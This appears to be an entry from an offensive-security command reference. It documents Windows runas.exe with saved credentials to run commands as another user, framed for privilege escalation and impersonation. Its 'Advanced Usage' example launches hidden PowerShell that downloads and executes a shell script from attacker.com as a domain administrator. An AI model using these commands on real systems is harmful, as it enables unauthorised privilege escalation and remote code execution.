---
type: command
executor: command_prompt
data: 'runas.exe /profile /user:$_DOMAIN\$_USERNAME /savedcred "$_COMMAND"'
platforms:
  - Windows
tags:
  - access-control
  - authentication
verified: true
validated: true
---

# runas-execute-command-with-saved-credentials

## Command

```command_prompt
runas.exe /profile /user:$_DOMAIN\$_USERNAME /savedcred "$_COMMAND"
```

## Description

This command invokes the native Windows runas.exe tool to execute a specified command or program as a different user, utilizing pre-saved credentials from the Windows Credential Manager to avoid interactive password prompts. It is ideal for non-interactive environments like remote shells, enabling seamless impersonation of domain or local accounts for tasks such as privilege escalation or running administrative tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | The domain name for the user account (e.g., 'CONTOSO' or empty for local accounts) | Yes |
| $_USERNAME | The username to impersonate (e.g., 'Administrator') | Yes |
| $_COMMAND | The full command or executable path to run as the specified user (e.g., 'cmd.exe /c dir C:\\Windows') | Yes |
| /profile | Loads the user's profile and environment variables for accurate execution context | No |
| /savedcred | Specifies use of saved credentials instead of prompting for a password | Yes |

## Examples

### Basic Usage

Execute a simple directory listing as a domain admin:
```command_prompt
runas.exe /profile /user:CONTOSO\Administrator /savedcred "cmd.exe /c dir C:\\Users"
```

### Advanced Usage

Run a PowerShell script download and execution as another user:
```command_prompt
runas.exe /profile /user:CONTOSO\Administrator /savedcred "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""
```

## Expected Output

Upon successful execution, runas.exe will not prompt for a password and will immediately spawn the target command. Output may include:

- A new command window if the command launches an interactive shell (e.g., cmd.exe).
- Direct stdout/stderr from the command if non-interactive (e.g., 'dir' output showing files owned by the target user).
- No errors like "Enter the password for $_USERNAME:".

Example successful run (non-interactive command):
```
C:\>runas.exe /profile /user:CONTOSO\Administrator /savedcred "cmd.exe /c whoami"

contoso\administrator
```

If credentials are not saved or invalid, expect:
```
RUNAS ERROR: Unable to acquire user password
```

## Related

- [[procedures/Run-a-Command-as-Another-User-using-Saved-Credentials]]
